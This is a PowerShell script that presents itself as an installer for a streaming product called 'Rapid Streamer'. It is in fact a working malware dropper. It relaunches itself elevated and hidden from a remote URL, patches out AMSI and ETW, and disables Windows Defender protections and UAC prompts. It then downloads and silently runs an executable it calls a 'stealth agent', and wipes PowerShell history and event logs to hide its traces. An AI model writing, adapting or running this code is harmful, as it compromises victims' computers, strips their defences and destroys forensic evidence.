# ========================================================
# RAPID STREAMER - HYPER-STREAM INSTALLATION v6.0
# ========================================================

# 1. ELEVATION CHECK & SILENT UPGRADE
function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    # Re-download and execute in elevated session (MyInvocation.MyCommand.Path is null under iex)
    $elevateCmd = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"iex(irm 'https://streamer.luffycpp.in/install/secure')`""
    Start-Process powershell.exe -ArgumentList $elevateCmd -Verb RunAs -WindowStyle Hidden
    exit
}

# 2. TACTICAL BYPASSES (SILENT & FAST)
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    
    # Disable ETW (Event Tracing for Windows)
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($etw) {
        $etwField = $etw.GetField('etwProvider','NonPublic,Static')
        if ($etwField) { $etwField.SetValue($null, 0) }
    }
} catch {}

# 3. PREMIUM PROGRESS DRAWER
function Draw-ProgressBar {
    param([int]$Percent, [string]$Status)
    $width = 40
    $done = [Math]::Floor($Percent / 100 * $width)
    $left = $width - $done
    $bar = "[" + ("=" * $done) + (">") + ("." * $left) + "]"
    $color = if ($Percent -gt 80) { "Green" } else { "Cyan" }
    Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
}

# 4. HYPER-STREAM DOWNLOADER (No Warning, Reliable Progress)
function Invoke-HyperStreamDownload {
    param([string]$Url, [string]$TargetPath)
    
    try {
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.UserAgent = "Microsoft-CryptoAPI/10.0"
        $request.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
        $request.Timeout = 30000
        
        $response = $request.GetResponse()
        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { 100MB }
        
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($TargetPath)
        $buffer = New-Object byte[] 65536
        $totalRead = 0
        
        while ($true) {
            $read = $stream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) { break }
            
            $fileStream.Write($buffer, 0, $read)
            $totalRead += $read
            
            $pct = [int](($totalRead / $totalSize) * 100)
            if ($pct -gt 100) { $pct = 100 }
            Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
        }
        
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        
        return (Test-Path $TargetPath)
    } catch {
        if ($fileStream) { $fileStream.Close() }
        return $false
    }
}

# 5. MAIN EXECUTION
try {
    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
    
    $rnd = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
    $exe = "$env:TEMP\$rnd.exe"
    $url = "https://streamer.luffycpp.in/install/loader.php"
    
    Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
    Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
    
    # SILENT SECURITY BYPASSES
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
        
        $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
    } catch {}

    Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray
    if (-not (Invoke-HyperStreamDownload -Url $url -TargetPath $exe)) {
        throw "Hyper-Stream failed. Check connection."
    }

    Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
    Write-Host "[*] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan
    
    # Run with Hidden Window
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName = $exe
    $si.WindowStyle = 'Hidden'
    $si.CreateNoWindow = $true
    $si.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($si) | Out-Null
    
    Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
        "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
    }
    wevtutil cl "Windows PowerShell" 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    
    Write-Host "[+] SETUP COMPLETE. CHECK DASHBOARD.`n" -ForegroundColor Green

} catch {
    Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Cyan
}

# 6. SELF-DESTRUCT
Remove-Variable * -ErrorAction SilentlyContinue 2>$null
